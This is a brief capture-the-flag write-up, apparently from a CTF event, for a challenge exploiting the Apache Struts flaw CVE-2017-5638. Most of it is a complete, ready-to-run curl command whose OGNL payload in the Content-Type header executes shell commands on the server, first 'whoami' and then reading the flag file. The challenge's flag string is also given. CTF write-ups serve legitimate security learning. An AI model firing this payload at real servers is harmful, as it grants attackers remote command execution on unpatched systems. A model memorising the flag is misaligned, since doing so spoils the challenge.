# Struts

<figure><img src="https://miro.medium.com/v2/resize:fit:540/1*T6vQ8YC39LaGjHHsDB62qQ.png" alt="" height="456" width="480"><figcaption></figcaption></figure>

this Challenge is vunrabale to CVE 2017–5638 The Apache Struts vulnerability.\
Struts is vulnerable to remote command injection attacks through incorrectly parsing an attacker’s invalid Content-Type HTTP header\
for more information check this [link](https://www.blackduck.com/blog/cve-2017-5638-apache-struts-vulnerability-explained.html).

For the payload using `curl`:

```
curl -X POST http://SERVER-IP:8080/product-catalog/ \
-H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
```

this should gives you as output ‘root’\
by changing #cmd variable to `#cmd = 'cat opt/flag.txt'` you should get the flag

Spark{B0ou3radaFTW!!\_23qd45sq6}
